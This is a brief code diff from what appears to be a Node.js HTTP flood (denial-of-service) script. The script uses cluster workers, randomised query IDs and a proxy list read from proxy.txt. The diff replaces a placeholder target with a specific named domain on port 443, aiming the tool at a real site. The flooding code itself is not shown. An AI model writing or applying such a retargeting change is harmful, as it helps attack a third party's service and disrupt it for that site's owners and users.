@@ -5,7 +5,7 @@ const { randomBytes } = require('crypto');
 const { cpus } = require('os');
 const cluster = require('cluster');
 
-const TARGET_HOST = 'your-domain.com';
+const TARGET_HOST = 'https://empire.zexcloud.one';
 const TARGET_PORT = 443;
 const TARGET_PATH = '/?id=';
 const PROXIES = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
